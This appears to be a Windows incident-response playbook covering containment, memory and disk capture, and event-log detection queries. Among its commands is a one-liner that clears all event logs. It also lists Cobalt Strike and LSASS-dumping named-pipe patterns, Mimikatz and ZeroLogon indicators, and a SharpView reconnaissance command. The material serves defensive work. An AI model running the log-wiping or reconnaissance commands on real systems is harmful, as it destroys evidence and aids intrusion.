# Windows - Compromised Host

This playbook describes the steps to perform containment, analysis and recovery on a compromised Windows instance. Please note that it is assumed that the forensics and test instances are being deployed in a Google Cloud (GCP) environment, hence `gcloud` commands are provided for deploying, containing instances. 

The exact same concepts can be applied for other environments.

## Pre-requisites

### Forensics Instance Setup

#### Windows

For the Forensics instance, we deploy a Windows instance using the following command in `GCP` as an example:

```
# Deploy a windows forensics instance of type Windows Server 2022 DC edition, in project `citric-snow-362912` and disk size of 60GB
gcloud compute instances create windows-forensics-instance \
    --project=citric-snow-362912 \
    --zone=us-central1-c \
    --machine-type=e2-standard-4 \
    --network-interface=network-tier=PREMIUM,stack-type=IPV4_ONLY,subnet=default \
    --maintenance-policy=MIGRATE \
    --provisioning-model=STANDARD \
    --service-account=507227860050-compute@developer.gserviceaccount.com \
    --scopes=https://www.googleapis.com/auth/devstorage.read_only,https://www.googleapis.com/auth/logging.write,https://www.googleapis.com/auth/monitoring.write,https://www.googleapis.com/auth/servicecontrol,https://www.googleapis.com/auth/service.management.readonly,https://www.googleapis.com/auth/trace.append \
    --create-disk=auto-delete=yes,boot=yes,device-name=instance-20240421-220752,image=projects/windows-cloud/global/images/windows-server-2022-dc-v20240415,mode=rw,size=60,type=projects/citric-snow-362912/zones/us-central1-c/diskTypes/pd-balanced \
    --tags=rdp-server \
    --no-shielded-secure-boot \
    --shielded-vtpm \
    --shielded-integrity-monitoring \
    --labels=goog-ec-src=vm_add-gcloud \
    --reservation-affinity=any
```

Ensure that access to RDP port is enabled via the network tag `rdp-server` to be able to connect to the instance:
```
gcloud compute firewall-rules create rdp-server \
    --network "default" \
    --direction ingress \
    --allow=tcp:3389 \
    --target-tags=rdp-server \
    --description "Allow RDP port 3389 for accessing Windows servers"
```

Connect via RDP to the Forensics instance and launch Powershell as an Administrator. Then, execute the [script](./InstallForensicsDeps.ps1) which will install all the necessary forensic tools discussed here. The script can also be modified to install most dependencies on a USB stick instead by editing the `INSTALL_LOCATION` variable.

Live memory images or disk images taken from the compromised instance can then be attached to the instance for analysis. Alternatively, USB sticks can be attached to the instance for live analysis.

#### Ubuntu
For the Forensics instance, we deploy an Ubuntu 22.04 instance by following the steps [here](../gcp_compromised_pod#ubuntu). Live memory images or disk images taken from the compromised instance can then be attached to this instance for analysis

### Scenario Setup

To setup the scenario which can be explored, we deploy a Windows server and enable Sysmon with it using the sysmon config file available [here](https://gist.github.com/manasmbellani/1baccb274e6deae15befd0a736ad8f36/raw/sample-sysmon-config.xml)

```
C:\Users\Administrator\Desktop\opt\sysinternals\Sysmon64.exe -accepteula -i C:\Users\Administrator\Desktop\opt\sysmon-config\sample-sysmon-config.xml
```

Additionally, we enable powershell logging via powerhshell:
```
Write-Host "[*] Enabling Module Logging..."
New-Item -Path "Registry::HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell" -Force
New-Item -Path "Registry::HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Force
New-Item -Path "Registry::HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames" -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames" -Name "*" -Value "*" -PropertyType "String" -Force

Write-Host "[*] Enabling Scriptblock Logging..."
New-Item -Path "Registry::HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value "1" -PropertyType "DWORD" -Force
```

To clear windows audit event logs to start afresh, we run the following command:
```
wevtutil el | Foreach-Object {wevtutil cl "$_"}
```

Setup the Active Directory Certificate Services for practice as required by following the steps in the guide [here](https://campus.barracuda.com/product/websecuritygateway/doc/112167659/how-to-install-ad-cs-on-windows-server/) and setup the logging for Active Directory Certificate Services by following this guide [here](https://www.pkisolutions.com/enabling-active-directory-certificate-services-adcs-advanced-audit/). 

The server roles to install and configure in addition to `Certification Authority (CA)` are:
- Certification Authority
- Certificate Enrollment Policy Web Service
- Certificate Enrollment Web Service
- Certificate Authority Web Enrollment

Configure a new certificate by following the steps [here](https://thesecmaster.com/blog/step-by-step-procedure-to-create-a-custom-csr-on-a-windows-server) to generate a CSR and receive a certificate.

Change the Group Policy to enable logging to be enabled for ADCS services as described [here](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn786422(v=ws.11)):

```
certutil –setreg CA\AuditFilter 127
net stop certsvc && net start certsvc
```

This would then allow the CA settings to be logged via the GPO / Local Security Policy as described [here](https://www.pkisolutions.com/enabling-active-directory-certificate-services-adcs-advanced-audit/):

```
Write-Host "[*] Enabling Object Access (including ADCS if enabled) audit policy..."
$command='& auditpol /set /category:"Object Access" /subcategory:"Certification Services" /success:enable /failure:enable'
Invoke-Expression "$command"
```

Ensure that auditing is set for all events under `certsrv.msc` > `Certification Authority` > Right-Click > Auditing > `Events to Audit`

Auditing should also be enabled for certificate templates via `ADSI Edit > Action > Connect to... > Select 'Configuration' in Naming Context instead of Default > CN=Services > CN=Public Key Services > CN=Certificate Templates`

## Containment

### Disconnect from wired networks

Remove ethernet cables AND other accessories e.g. desktop extenders which may have ethernet cables connected  to them.

### Disable IP networks

#### via netsh

List all the network interfaces

```
netsh interface show interface
```

Disable the specific network interaces

```
netsh interface set interface $INTERFACE_NAME admin=disabled
```

#### via powershell / Get-NetAdapter

List the network adapters:
```
Get-NetAdapter
```

Disable the specific network adapters:
```
Disable-NetAdapter -Name "$ADAPTER_NAME" -Confirm:$false
```

#### via Windows Defender / Microsoft Defender

[Security](https://security.microsoft.com) > Assets > Devices > Select Device > click on `...` > `Isolate Device`

#### via velociraptor

[Velociraptor](https://127.0.0.1:8889/app/index.html) > Click `search` icon on top > click on `client ID` > click on `suitcase` icon (`Quarantine Host`)


### Forget wireless networks

#### via netsh

Forget wireless networks

```
# Windows 10
netsh wlan delete profile name=* i=*

# OS earlier than Windows 10
netsh wlan delete profile *
```

### Disable BlueTooth Networks

#### via UI

Find option in the task bar to disable bluetooth network.

### Disable User Account

#### via powershell / Active Directory

```
Disable-ADAccount -Identity $UserName
```

## Collection

### Collect Live RAM 

#### via Belkasoft

To collect live RAM, we can leverage the `Belkasoft RAM Capturer` available from download [here](https://belkasoft.com/ram-capturer) and initiate the appropriate x64 bin from a remote USB disk. The memory image is then stored on this remote disk too, say `F:`

#### via DumpIT

Alternatively, we can also leverage `DumpIt.exe` provided by `Magnet Forensics` as part of its `Comae Toolkit` available [here](https://www.magnetforensics.com/resources/magnet-dumpit-for-windows/) to collect live RAM from the compromised host for analysis.
```
.\DumpIt.exe
```

#### via FTK Imager

```
"C:\Program Files\AccessData\FTK Imager\FTK Imager.exe" > File > Capture Memory > Select Destination Path (e.g. C:\Windows\TEMP) > Include Pagefile.sys
```

#### via winpmem

```
# Run as administrator for x64 system
C:\Users\Administrator\Desktop\opt\winpmem\winpmem_mini_x64_rc2.exe C:\Windows\Temp\physmem.raw

# Run as administrator for x86 system
C:\Users\Administrator\Desktop\opt\winpmem\winpmem_mini_x86.exe C:\Windows\Temp\physmem.raw
```

#### via velocirpator

Access GUI via https://127.0.0.1:8889, and leverage `Windows.Memory.Acquisition` to collect memory. Uses `winpmem` in the background to collect live memory.

##### deploying velocirpator 

In GUI Mode:
```
cd C:\Users\Administrator\Desktop\opt\velociraptor
velociraptor.exe gui
```

### Collect Disk Image

#### via FTK Imager

Can be used to create various disk types such as Raw Image (`dd`), Smart, E01 (Autopsy/Encase compatible) and AFF.
```
"C:\Program Files\AccessData\FTK Imager\FTK Imager.exe" > File > Create Disk Image > Physical Drive
```

For folders (e.g. `Kape` disk artifacts below ), can create `AD1` type disk image

#### via dc3dd

Identify the `PHYSICALDRIVE` image identifier to create disk of using FTK Imager [here](#via-ftk-imager-1)

Run `dc3dd` command to take an image to specified folder:

```
C:\Users\Administrator\Desktop\opt\dc3dd\dc3dd-dcfl-win7-64-7-2-641\dc3dd.exe if=\\.\PHYSICALDRIVE0 of=C:\Windows\Temp\disk.dd hash=sha256 log=C:\Windows\Temp\disk.log
```

Taken from [here](https://www.forensicfocus.com/articles/windows-drive-acquisition/)

### Collect Windows Event Logs

#### via velociraptor

- Also allows for the logs to be scanned for IOCs via `Windows.EventLogs.Evtx` Artifact

#### via powershell

Use [Get-WinEvtxLogs.ps1](Get-WinEvtxLogs.ps1) script to retrieve the logs on the device

#### via ETW / volatility3 / jpcert's etw-scan / tracefmt

```
# List all ETW Providers
python3 vol.py -f /root/samples/106-RedLine/MemoryDump.mem -p /opt/etw-scan/plugins etwscan.etwProvider

# Kali
# Dump all consumers as EVTL files
cd /opt/volatility3-patched/
source venv/bin/activate
python3 vol.py -f /root/samples/106-RedLine/MemoryDump.mem -p /opt/etw-scan/plugins etwscan.etwConsumer --dump
deactivate

# Windows
# For checking network activity, see LwtNetLog ETL files which collects various types of information, including communication packets, DNS access, and DHCP
# tracefmt.exe Requires visual studio to be installed
tracerpt.exe LwtNetLog.0xAD8185BCB000.global.etl -o LwtNetLog.0xAD8185BCB000.global.evtx -of EVTX -lr
tracefmt.exe LwtNetLog.0xAD8185BCB000.global.etl --no-summary
```

https://blogs.jpcert.or.jp/en/2024/11/etw_forensics.html

### Collect Disk Artifacts

#### via Velociraptor Offline Collector / plaso

```
# Specify the Device to run artifact search on
# Then load on to a velociraptor server / gui via Server Artifacts > Server.Utils.ImportCollection
.\velociraptor.exe -v artifacts collect Windows.KapeFiles.Targets --output TriageFile.zip --args Device="C:,D:" --args KapeTriage=Y --args _SANS_Triage=Y --args Notepad=Y --args MemoryFiles=Y

# We can then run processing on the triage file on a system with plaso installed
mkdir ~/triagefile
mv TriageFile.zip ~/triagefile
unzip TriageFile.zip
docker run --rm -it -v ~/triagefile:/data log2timeline/plaso log2timeline --storage-file /data/host.plaso /data/uploads/auto/C%3A
# Convert results to CSV from .plaso file to view in TimelineExplorer
docker run -v ~/triagefile:/data log2timeline/plaso psort -o l2tcsv -w /data/timeline.csv /data/host.plaso
```

https://docs.velociraptor.app/docs/offline_triage/

https://fiskeren.github.io/posts/deadhostinvestigation/

#### via Kroll (KAPE)

KAPE can also be run from a USB stick as described [here](https://threatintelligencelab.com/tools/step-by-step-guide-to-forensically-acquiring-logs-with-kape/#:~:text=Insert%20USB%20Drive%3A%20Plug%20the,selecting%20%E2%80%9C%20Run%20as%20Administrator%20%E2%80%9C.)

```
cd C:\Users\Administrator\Desktop\opt\kape\KAPE
.\kape.exe --sync

# Perform most important file collection on a disk to a specific destination. Leverage .\gkape.exe to build the command (without 'Flush' ideally)
.\kape.exe --tsource C: --tdest C:\Windows\Temp --target !SANS_Triage --gui
## If using vhdx file format, leverage the following command:
.\kape.exe --tsource C: --tdest C:\Windows\Temp\kape --tflush --target !SANS_Triage --vhdx test --gui
```

See [FTK Imager](#via-ftk-imager) for more information on how to create disk images (AD1) .

#### via velociraptor

Follow the steps [here](##deploying-velocirpator) to launch velociraptor > start `Hunt` on targets via `Windows.KapeFiles.Targets` to collect Kapefiles > Select `_SANS_Triage`

#### via WINTri

```
cd C:\Users\Administrator\Desktop\opt\WINTri
.\WINTri.ps1
```

Taken from [here](https://github.com/DCScoder/WINTri)

### Mount Disks

#### via FTK Imager

Can be used to mount both physical (e.g. E01) and logical disks

#### via linux / ewfmount

Can be used to mount disk in Linux host

```
ewfmount charlie-work-usb-2009-12-11.e01 /mnt/disk

mkdir /mnt/disk /mnt/windows_data

# Find sector where NTFS partition starts (this is *512 bytes)
mmls  /mnt/disk/ewf1
mount -t ntfs-3g -o loop,ro,show_sys_files,stream_interface=windows,offset=$((1*512)) /mnt/disk/ewf1 /mnt/windows_mount
```

To unmount:

```
umount /mnt/windows_mount
umount /mnt/disk
```

Taken from [here](https://dfirmadness.com/mounting-case001-e01-files/)

### Detect Encrypted Disks

#### via Magnet Forensics' Encrypted Disk Detector

Good to know if disks are encrypted beforehand during collection steps since encrypted disks may lose more volatile data than non-encrypted disks as described [here](https://www.raedts.biz/forensics/should-you-pull-the-plug/)

```
C:\Users\Administrator\Desktop\opt\encrypted-disk-detector\encrypted-disk-detector.exe
```

### Export Emails for Analysis

Assuming the compromise could have started using phishing emails.

#### for Office 365

Refer to this [link](../azure_compromised_account/README.md#extract-emails-for-analysis) for details on how to export emails for analysis e.g. in case of phishing sites.

### Collect Recall Artifacts

If enabled, can help detect from screenshots and contextual text parsing, commands, outputs, etc.

#### via kape / Kapefiles from Eric Zimmerman

Upload [Windows Copilot Recall file](https://raw.githubusercontent.com/EricZimmerman/KapeFiles/refs/heads/master/Targets/Windows/WindowsCopilotRecall.tkape) to Kape > Targets and then use gkape to select Targets. Specify the `Target Source` as the directory with the files and `Target Destination` the location where the files are copied.

See [cyber.cx](https://cybercx.com.au/blog/forensic-applications-of-microsoft-recall/) for more info

#### via velociraptor, windows.system.recall.allwindowevents, windows.system.recall.windowcaptureevent

Upload velociraptor artifacts under velociraptor > view artifacts > Upload artifact button > Add to Zip file the following YAML files > [1](https://docs.velociraptor.app/exchange/artifacts/pages/windows.system.recall.allwindowevents/), [2](https://docs.velociraptor.app/exchange/artifacts/pages/windows.system.recall.windowcaptureevent/)

See [cyber.cx](https://cybercx.com.au/blog/forensic-applications-of-microsoft-recall/) for more info

#### via manually

Location on disk: `C:\Users\*\AppData\Local\CoreAIPlatform.00\UKP\*\`

Details about each SQLITE table: https://cybercx.com.au/blog/forensic-applications-of-microsoft-recall/

### Collect variety of indicators from device

#### via powershell / Defender Live Response / Bert Jan's DFIR Script

https://github.com/Bert-JanP/Incident-Response-Powershell/blob/main/DFIR-Script.ps1

https://kqlquery.com/posts/leveraging-live-response/

### Copying locked files

#### via RawCopy

https://whatsoftware.com/copy-locked-file-in-use-with-hobocopy/

#### via various methods

https://whatsoftware.com/copy-locked-file-in-use-with-hobocopy/

#### via KAPE

KAPE knows how to get data out of system locked files, locked files in general. See [here](#via-kroll-kape)


## Analysis

This section covers a variety of techniques which can be used for both live and offline analysis.

In case of live analysis, we have ability to connect a USB stick to the contained instance with tools running on the USB stick. 

Note that majority of the steps described in `Offline / Disk Analysis` could be performed in `Live Analysis` as well by copying the binaries to the USB stick and attaching it to the compromised instance.

### Analyse unusual uncommon event IDs

- Could be indicative of suspicious activities

#### via hayabusa / eid-metrics

```
# Specify single .evtx file via -f OR directory for all .evtx files
./hayabusa eid-metrics -d /root/samples/winlogs | less -R 
```

### Analyse the Clipboard contents and modify

#### via Edit-Clipboard-Contents

```
C:\Users\azureuser\Desktop\opt\Edit-Clipboard-Contents\Edit-Clipboard-Contents.exe
```

https://github.com/ThioJoe/Edit-Clipboard-Contents

### Get the Cookies from various Browsers such as Internet Explorer, Google Chrome

#### via dir

```
dir C:\Users\*\AppData\Local\Microsoft\Windows\INetCookies
dir C:\Users\*\AppData\Roaming\Microsoft\Windows\Cookies
dir C:\Users\*\AppData\Roaming\Microsoft\Windows\Cookies\Low
```

### Detect unsual attack surface reduction rule triggers

#### via Windows Event Logs / Security / EventID 5007,1121,1122

```
EventID = 5007 (Event when Defender's settings are changed) OR 1121	(Event when rule fires in Block-mode) OR 1122	(Event when rule fires in Audit-mode)
Channel = Microsoft-Windows-Windows Defender/Operational
```

https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction#review-attack-surface-reduction-events-in-windows-event-viewer

#### via Microsoft Defender Audit Logs / KQL / DeviceEvents

```
DeviceEvents
| where ActionType startswith 'Asr'
```
https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction#review-attack-surface-reduction-events-in-windows-event-viewer

### Collect any unusual windows notifications

#### via Windows\Notifications folder, SQLiteBrowser

```
# View as an SQLITE database
\Users\\AppData\Local\Microsoft\Windows\Notifications
```

https://www.hecfblog.com/2018/08/daily-blog-440-windows-10-notifications.html

### Detect ANYTHING unusual

#### via mthcht's Threat Hunting keywords

https://mthcht.github.io/ThreatHunting-Keywords/

### Detection for unusual web requests in web logs

#### via IIS server

- Look for unusual web requests to `/autodiscover/autodiscover.json` as seen in `C:\inetpub\logs\LogFiles` which can be sign of proxyshell: https://m365internals.com/2022/10/18/hunting-and-responding-to-proxyshell-attacks/
- Look for unusual web requests in `C:\Program Files\Microsoft\Exchange Server\V15\Logging\HttpProxy\Autodiscover` to identify proxyshell attempts: https://m365internals.com/2022/10/18/hunting-and-responding-to-proxyshell-attacks/

### Detection for unusual machine accounts

- Exploitation attempts from noPac may involve creation of machine account `https://github.com/Ridter/noPac`
  
#### via Windows Event Logs / Event ID 4741

```
# Attributes.SAM Account Name contains the machine account name, Subject.Account Name contains the user that created the account
EventID = 4741 (A computer account was created)
Channel = Security
```

### Detection for unusual SQL Server Changes

- Look for reference to `xp_cmdshell` for the SQL Server changes. Eg: [stephan berger](https://www.linkedin.com/posts/stephan-berger-59575a20a_who-actively-monitors-the-application-event-activity-7270898589713809408-QTR7?utm_source=share&utm_medium=member_desktop), [sigma](https://github.com/SigmaHQ/sigma/blob/6fd57da13139643c6fe3e4a23276ca6ae9a6eec7/rules/windows/builtin/application/mssqlserver/win_mssql_xp_cmdshell_change.yml)
  
#### via Windows Event Logs / Event ID 15457

```
Channel = Microsoft-Windows-SQLServer
LogName = Application
EventID = 15457 (SQL Server Configuration Changes)
```

#### via Windows Event Logs / Event ID 33205

- Pre-requisite: expect the MSSQL Audit Policy to be enabled
- Captures details like stored procedure calls executed when SQL service is started eg persistence. Look for 'sp_procoption' with procedure name in the `statement` field

```
Channel = Microsoft-Windows-SQLServer
LogName = Application
Source = MSSQLSERVER
EventID = 33205 (SQL Audit Event)
```

https://docs.logrhythm.com/devices/docs/evid-33205-sql-audit-event

https://www.netspi.com/blog/technical-blog/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/

### Detection for unusual re-enabling of domain accounts

- Threat actors may enable old accounts with privileged access to evade detections rather than creating new accounts
  
#### via Windows Event Logs / Security / Event ID 4722

```
# Look for Subject.Account Name which performed the action (is it unusual?) on Target Account.Account Name?
EventID: 4722 (A user account was enabled)
Channel = Security
```

#### via Windows Event Logs / Security / Event ID 4738

```
# Look for Subject.Account Name which performed the action (is it unusual?) on Target Account.Account Name?
EventID: 4738 (A user account was changed)
Channel = Security
Changed Attributes.Old UAC Value = 0x10
Changed Attributes.New UAC Value = 0x11
User Account Control: Enabled
```

### Detection for unusual Appx installation packages

- Can detect installation of Remote Monitoring tools like QuickAssist.exe seen by threat actors being used in campaigns as posted by [microsoft](https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/#:~:text=Threat%20actors%20misuse%20Quick%20Assist,access%20to%20a%20target%20device.)

#### via Windows Event Logs / AppxDeployment Logs / Event ID 327 

```
Channel = Microsoft-Windows-AppXDeployment/Operational
EventID = 327 (The following packages will be installed: .... . The following packages will be removed: ...)
```

#### via Windows Event Logs / AppxDeploymentServer Logs / Event ID 819

```
Channel = Microsoft-Windows-AppXDeploymentServer/Operational
EventID = 819 (The following packages will be installed: MicrosoftCorporationII.QuickAssist_2022.509.2259.0_neutral_~_8wekyb3d8bbwe . The following packages will be removed: NULL)
```

### Detection for unusual Remote / RDP session connections

- Can reveal the RDP connections being made from unusual locations
- More detections available [here](#detect-rdp-authentication-sessions)

#### via Windows Event Log / 4624

```
# Taken from: https://frsecure.com/blog/rdp-connection-event-logs/
Channel = Security
Event ID = 4624
Logon Type = 10 (Remote Interactive Session) OR LogonType = 7 (Unlock of aaccount)
```

#### via Windows Event Log / 4625

```
# Taken from: https://frsecure.com/blog/rdp-connection-event-logs/
Channel = Security
Event ID = 4625
Logon Type = 10 (Remote Interactive Session when NLA NOT Enabled) OR LogonType = 3 (Network, RDP when NLA is enabled)
```

https://ponderthebits.com/2018/02/windows-rdp-related-event-logs-identification-tracking-and-investigation/

#### via Windows Event Log / 4778

```
# Can contain client hostname and client ip addresses from which RDP session was connected under Additional Information.Client Name and Additional Information.Client Address fields respectively
Channel = Security
Event ID = 4778 (A session was reconnected to a Window Station)
```
  
### Detection for unusual antivirus / AV activity e.g Microsoft Windows Defender

- Search for indicators that could be malware by matching `SignatureName` via the keywords list in [nextron-systems.com](https://www.nextron-systems.com/2022/02/06/antivirus-event-analysis-cheat-sheet-v1-9-0/) in case there are too many lgs

#### via Windows Event Logs / Microsoft Defender

```
Channel = Microsoft-Windows-Windows Defender/Operational
EventID = 1117 OR 1116 OR 1006 OR 1007 OR ...
```

Look for all quarantined files / malware files using the events list from [learn.microsoft.com](https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-microsoft-defender-antivirus)

#### via Microsoft Sentinel / KQL / DeviceEvents table

```
# Signature in AdditionalFieldsJson.SignatureName
DeviceEvents
| where ActionType == "AntivirusDetection"
| extend AdditionalFieldsJson = parse_json(AdditionalFields)
| sort by TimeGenerated desc
```

### Detection for unusual computer account / user account changes

- Look for unconstrained delegation for computer (allows for TGT for any account logged into computer to be stored on PC itself) being set for a computer based on [learn.microsoft.com](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/b10cfda1-f24f-441b-8f43-80cb93e786ec).

- Look for unconstrained delegation for user (allows for user to act as any user to connect to any service).
More info [ired.team](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

- Look for constrained delegation (If you have compromise user account or a computer (machine account) that has kerberos constrained delegation enabled, it's possible to impersonate any domain user (including administrator) and authenticate to service that the user account is trusted to delegate to).

- If surrounded by event ID 5805 (provider=NETLOGON, Channel=System, Level=Error) with description `The session setup from the computer .......... failed to authenticate. The following error occurred: Access is denied`, then it could indicate successful `ZeroLogon` exploit (CVE-2020-1472) as per [0xbandar](https://0xbandar.medium.com/detecting-the-cve-2020-1472-zerologon-attacks-6f6ec0730a9e). Also, `Account Name` would be `ANONYMOUS LOGON`. Note: Sometimes this activity can be common e.g. on DCs every 30 days as per [0xbandar](https://0xbandar.medium.com/detecting-the-cve-2020-1472-zerologon-attacks-6f6ec0730a9e)

- Unusual password resets

```
SharpView.exe Get-NetComputer -TrustedToAuth
```

#### via Windows Event Logs / Event ID 4742 / Event ID 4738

```
# Kerberos Unconstrained Delegation
EventID = 4742 (A computer account was changed) OR EventID = 4738 (A user account was changed)
Channel = Security
NewUACValue = 2*** (Indicative of trust delegation being set)

# Kerberos Constrained Delegation (works for users only, not computers)
EventID=4738 (A user account was changed)
Channel = Security
AllowedToDelegateTo = * (set)

# Unusual password resets + surrounded by EventID 5805 can indicate Zero Logon Exploit (another issue identified)
EventID=4742 (A computer account was changed)
Changed Attributes.PasswordLastSet = *
```

https://github.com/reprise99/Sentinel-Queries/blob/main/Active%20Directory/SecurityEvent-UnconstrainedDelegationEnabled.kql


### Detection for unusual windows filtering platform connections

- Can detect tools like `EDRSilencer.exe` [here](https://github.com/netero1010/EDRSilencer) which block connectivity to the Cloud for EDR to stop detections as discussed [here](https://blog.p1k4chu.com/security-research/adversarial-tradecraft-research-and-detection/edr-silencer-embracing-the-silence)
```
auditpol /set /subcategory:"Filtering Platform Policy Change" /success:enable /failure:enable
```
- Note that this requires `Filtering Platform Policy Change` set via `auditpol`.


#### via Windows Audit Event Logs / 5447, 5448

```
# Additional Information.Conditions field in Event ID 5447 contains more info about the exe being blocked
EventID = 5447 (A Windows Filtering Platform filter has been changed) OR EventID = 5448 (A Windows Filtering Platform provider has been changed)
ChangeType = Add
```

### Detection for unusual named pipe events

```
# Look for https://detect.fyi/threat-hunting-suspicious-named-pipes-a4206e8a4bc8
## SMB Lateral Movement
\\.\pipe\srvsvc
\\.\pipe\wkssvc
\\.\pipe\browser

## When dumping LSASS, ‘pipe connect’ to \\.\pipe\lsass initiated by process eg taskmgr.exe, procdump
\\.\pipe\lsass

## WebDAV service
\\.\pipe\DAV RPC SERVICE

## Service Control Manager Remote Protocol:
\\.\pipe\svcctl

## Remote Desktop
\\.\pipe\termsrv
\\.\pipe\TSVCPIPE-*

## EventLog
\\.\pipe\eventlog

## RPC over SMB
\\.\pipe\netdfs

## RPC Protocol
\\.\pipe\epmapper
\\.\pipe\lsass
\\.\pipe\samr
\\.\pipe\initshut
\\.\pipe\ntsvcs
\\.\pipe\scerpc

## SQL Server
\\.\pipe\sql\query
\\.\pipe\MSSQL$<instance_name>\sql\query

## Netlogon Service
\\.\pipe\netlogon

## Print Spooler Service
\\.\pipe\spoolss

## Task Scheduler
\\.\pipe\atsvc

## Known cobaltstrike named pipes 
\\.\pipe\postex_*
\\.\pipe\postex_ssh_*
\\.\pipe\status_*
\\.\pipe\msagent_*
\\.\pipe\MSSE-*
\\.\pipe\*-server
```

#### via Windows Event Logs / Sysmon / Event ID 17, 18

```
EventID = 17 (Pipe Created) OR EventID = 18 (Pipe connected)
Channel = "Microsoft-Windows-Sysmon/Operational"
Provider Name = "Microsoft-Windows-Sysmon"
```

#### via Windows Microsoft Defender / KQL / DeviceEvents

```
DeviceEvents
| where ActionType contains "NamedPipeEvent"
| extend pipeName=parse_json(AdditionalFields).PipeName
| sort by TimeGenerated desc

# Example: Look for suspicious windows events based on https://raw.githubusercontent.com/mthcht/awesome-lists/refs/heads/main/Lists/suspicious_named_pipe_list.csv
// Load the external CSV file containing suspicious named pipes
let SuspiciousNamedPipes = externaldata(
    pipe_name: string,
)
[
    h@"https://raw.githubusercontent.com/mthcht/awesome-lists/refs/heads/main/Lists/suspicious_named_pipe_list.csv"
]
with (format="csv");
let t = SuspiciousNamedPipes;
t
DeviceEvents
| where ActionType contains "NamedPipeEvent"
| extend pipeName=parse_json(AdditionalFields).PipeName
| extend pipeName  = replace_string(tostring(pipeName), "\\Device\\NamedPipe", "")
| join kind=inner (
    SuspiciousNamedPipes
) on $left.pipeName contains $right.pipe_name
| sort by TimeGenerated desc
```

https://www.splunk.com/en_us/blog/security/named-pipe-threats.html

### Detection for unusual active directory (AD) services changes

- Can detect changes to Active Directory Group Services
- Can detect Resource-based constraint delegation if `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute is being changed via `Attribute.LDAP Display Name` as described here: https://swolfsec.github.io/2023-11-29-Detecting-Resource-Based-Constrained-Delegation/
- If `Operation.Name` is set to `msDS-AllowedToActOnBehalfOfOtherIdentity` `{3f78c3e5-f79a-46bd-a0b8-9d18116ddc79}` as listed here: https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity for Event ID `4662`, then that can also indicate Resource-based Constrained Delegation Exploitation Attempt as described here: https://www.fortalicesolutions.com/posts/hunting-resource-based-constrained-delegation-in-active-directory
  
#### via Windows Audit Event Logs / 5136

```
# Look for changes from unusual 'Subject.Account Name'
EventID = 5136 (A directory service object was modified)
Channel = Security
```

#### via Windows Audit Event Logs / 4662 

```
EventID = 4662  (An operation was performed on an object)
Channel = Security
```

### Detection for unusual Credential Manager Reads

- Can detect Mimikatz `vault::read` attempts to credentials saved in memory 
  
#### via Windows Audit Event Logs

```
# Captures 
EventID = 5379 (Credential Manager credentials were read)
Channel = Security
```


### Detection for unusual account changes

Can detect activites, like:
- Addition of Service Principal Names (SPNs) aka `Force SPN Set` (even though the service principal name added may not be shown)
  

#### via windows event logs / 4738

```
EventID = 4738 (A user account was changed)
Channel = Security
```

### Detection for unusual user password resets

- Can be indicative of password resets via commands like `net.exe`

#### via Windows Event Logs / Event ID 4738

```
# Monitor the `Password Last Set` date for changes
EventID = 4738 (A User's account was changed)
Channel = Security
```
  
#### via Windows Event Logs / Event ID 4724

```
# Target Account.Account Name is the username on which the password was reset
EventID = 4724 (An attempt was made to reset a user's password) 
Channel = Security
```

### Detection for unusual DLLs / images loaded

Look for artifacts like: 
```
# For .NET Assembly executions in memory against the same processID or process 
ImageLoaded: *\clrjit.dll AND ImageLoaded: *\clr.dll

# For detecting if there are any interesting sideloaded events
ImageLoaded: *.dll and !(ImageLoaded: C:\\Windows AND ImageLoaded: "C:\\Program Files\\" AND ImageLoaded: "C:\\Program Files(x86)\\")

# Look for taskschd.dll being loaded by unusual processes e.g excel.exe to look for creation of scheduled tasks (also generates 4698)
# https://www.linkedin.com/pulse/lolbin-attacks-scheduled-tasks-t1503005-how-detect-them-v%C3%B6gele/
taskschd.dll 
```
- Images being loaded from TEMP / Desktop / Downloads folder as highlighted [here](https://github.com/manasmbellani/ir-playbooks/blob/master/win_compromised_host/README.md#via-explorer)


#### via velociraptor / HijackLibs / DetectRaptor.Windows.HijackLibsMFT

- Performs lookup event with HijackLibs API to detect if there are any unusual libraries for programs that are known to be hijackable
- Artifact is `DetectRaptor.Windows.Detection.HijackLibsMFT`

#### via velociraptor / HijackLibs / DetectRaptor.Windows.HijackLibsEnv

- Performs lookup event with HijackLibs API to detect if there are any unusual libraries for programs that are known to be hijackable
- Artifact is `DetectRaptor.Windows.Detection.HijackLibsEnv`

#### via Microsoft Windows Defender / KQL

```
# Look for device image load events and exclude known folder paths
# Join data with Certificate Signer data from Defender
DeviceImageLoadEvents
| where FileName endswith ".dll"
| where not(FolderPath  startswith "C:\\Windows\\" or FolderPath startswith "C:\\Program Files\\" or FolderPath startswith "C:\\Program Files(x86)\\")
# To join against Certificate info about the images that are executed
| join DeviceFileCertificateInfo on SHA1
| project TimeGenerated, DeviceName, ActionType, FolderPath, SHA1, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFileName, Signer, CertificateSerialNumber
| where (Signer contains "Microsoft")
```

#### via Windows Audit Sysmon Event Logs / Event ID 7

```
# Look for .NET Assembly executions
EventID: 7 (Image Loaded)
Provider: Microsoft-Windows-Sysmon
ImageLoaded: <See above>
```


